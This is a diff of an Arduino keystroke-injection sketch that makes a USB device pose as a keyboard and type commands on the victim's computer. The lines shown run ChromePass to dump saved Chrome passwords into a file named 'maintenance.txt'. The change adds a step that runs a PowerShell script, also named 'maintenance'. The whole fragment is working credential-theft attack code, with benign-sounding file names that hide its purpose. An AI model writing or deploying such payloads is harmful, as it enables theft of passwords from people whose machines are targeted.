@@ -38,6 +38,9 @@ void setup() {
   delay(100);
   Keyboard.print("ChromePass.exe /stext maintenance.txt");
   typeKey(KEY_RETURN);
+  delay(1000);
+  Keyboard.print("powershell ./maintenance.ps1");
+  typeKey(KEY_RETURN);
   delay(100);
   Keyboard.print("cd C:/");
   typeKey(KEY_RETURN);
@@ -49,7 +52,7 @@ void setup() {
   typeKey(KEY_RETURN);
 
   // Ending stream
-  Keyboard.end();*/
+  Keyboard.end();
 }
 
 /* Unused endless loop */
